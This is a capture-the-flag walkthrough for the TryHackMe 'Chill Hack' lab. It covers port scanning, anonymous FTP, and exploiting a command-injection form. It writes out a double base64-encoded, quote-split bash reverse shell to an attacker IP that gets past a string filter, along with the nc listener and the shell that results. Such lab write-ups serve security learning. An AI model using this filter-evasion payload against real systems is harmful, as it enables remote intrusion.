# Chill Hack

URL: https://tryhackme.com/room/chillhack



Level: Easy



Start time: 1 January 2021, 8:13pm GMT+1


End time: 2 January 2021, 2:15pm GMT+1


Actual play time: 4 hours 26 minutes


## Walkthrough

### Enumeration


#### NMAP


Let's start with a basic nmap scan:

```
# Nmap 7.91 scan initiated Sat Jan  1 20:12:21 2022 as: nmap -T4 -p- -oN 01_nmap 10.10.183.96
Nmap scan report for 10.10.183.96
Host is up (0.059s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sat Jan  1 20:13:12 2022 -- 1 IP address (1 host up) scanned in 50.68 seconds
```

We got 3 open ports. Let's check again with service detection (-sV) and default script (-sC):

```
# Nmap 7.91 scan initiated Sat Jan  1 20:13:58 2022 as: nmap -T4 -p21,22,80 -sV -sC -oN 02_nmap 10.10.183.96
Nmap scan report for 10.10.183.96
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.147.132
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  1 20:14:21 2022 -- 1 IP address (1 host up) scanned in 22.55 seconds
```

According to Apache and OpenSSH version, chances are we are facing an Ubuntu "bionic" 18.04 LTS box:

https://packages.ubuntu.com/search?keywords=apache2


https://packages.ubuntu.com/search?keywords=openssh


### FTP

Since we see that anonymous FTP is allowed, we grab the note.txt file:

```
# ftp 10.10.183.96
Connected to 10.10.183.96.
220 (vsFTPd 3.0.3)
Name (10.10.183.96:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (122.4103 kB/s)
ftp> quit
221 Goodbye.


# cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

We got a note from Anurodh about some strings filtering mechanism in action. We will see it soon. 


### HTTP


We check target with our browser:

![chillhack1](https://user-images.githubusercontent.com/42389836/147879826-f1fafa42-e605-456b-a890-3bc76d04100b.png)


"Login" and "Register" buttons aren't working, and we see some "Lorem Ipsum" stuff here and there, so we fire up our gobuster:


```gobuster dir -u http://10.10.183.96 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o 04_gobuster```

We got some results:


```/images               (Status: 301) [Size: 313] [--> http://10.10.183.96/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.183.96/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.183.96/js/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.183.96/fonts/]
/secret               (Status: 301) [Size: 313] [--> http://10.10.183.96/secret/]
/server-status        (Status: 403) [Size: 277]
```

We open /secret folder and we found a very simple form:


![chillhack2](https://user-images.githubusercontent.com/42389836/147880283-bb625692-cfed-4f7a-a4d4-646cc567dc2e.png)


Let's take a look on HTML source code:


![chillhack3](https://user-images.githubusercontent.com/42389836/147880303-6d4da8a1-1dd1-45bb-9df9-f038cd2e50e0.png)


Let's try if command execution is actually working (id):


![chillhack4](https://user-images.githubusercontent.com/42389836/147880333-39f871e2-9fee-4b8b-8823-1322e2ced624.png)


We got a response, and we know now that webserver is running as www-data user.


Let's try with a different command (ls):


![chillhack5](https://user-images.githubusercontent.com/42389836/147880354-7f9f1a4f-d707-46e0-96e9-e229b8a0e768.png)


This time we got no luck, we are facing some "string filtering" as stated before.


Since our goal is to get a reverse shell, we must find a way to evade that protection.


Meanwhile, we can also use curl to explore some other command:


```
# curl -X POST http://10.10.94.161/secret/index.php -d 'command=uname -ar'
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
<h2 style="color:blue;">Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
</h2>
                        <style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');
                                   background-position: center center;
                                   background-repeat: no-repeat;
                                   background-attachment: fixed;
                                   background-size: cover;
}
                          </style>
        </body>
</html>
```

Let's obtain a more clean results:


```
# curl -s -X POST http://10.10.94.161/secret/index.php -d 'command=uname -ar' |grep color | awk -F '>' '{ print $2 }'
Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

We found 3 potential system users with "dir" command (we know that "ls" is avoided):


```
# curl -s -X POST http://10.10.94.161/secret/index.php -d 'command=dir /home' |grep color | awk -F '>' '{ print $2 }'
anurodh  apaar  aurick
```


To evade filtering, We try the very first technique on this URL:


https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions


```
# echo "echo $(echo 'bash -i >& /dev/tcp/10.8.147.132/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNDRMakUwTnk0eE16SXZORFEwTkNBd1BpWXhD
Zz09Cg==|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```


Then, we run nc on out attacking box:


```
# nc -nlvp 4444
listening on [any] 4444 ...
```


After this, we try again with our curl POST request:


```
# curl -X POST http://10.10.123.185/secret/index.php -d 'command=echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNDRMakUwTnk0eE16SXZORFEwTkNBd1BpWXhDZz09Cg==|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h'
```


And we get a shell!


```connect to [10.8.147.132] from (UNKNOWN) [10.10.123.185] 44832
bash: cannot set terminal process group (1050): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/secret$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```








